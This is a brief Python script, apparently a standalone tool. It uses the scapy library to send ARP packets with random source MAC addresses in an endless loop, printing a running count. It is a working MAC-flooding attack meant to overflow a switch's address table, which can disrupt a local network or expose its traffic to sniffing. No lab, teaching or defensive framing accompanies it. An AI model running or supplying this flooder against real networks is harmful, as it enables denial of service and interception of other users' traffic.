from scapy.all import *
import time
import os

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

cpt = 0

while True:
    packet = Ether(src=rand_mac())/ARP()
    sendp(packet, verbose=0)
    print(cpt)
    cpt += 1
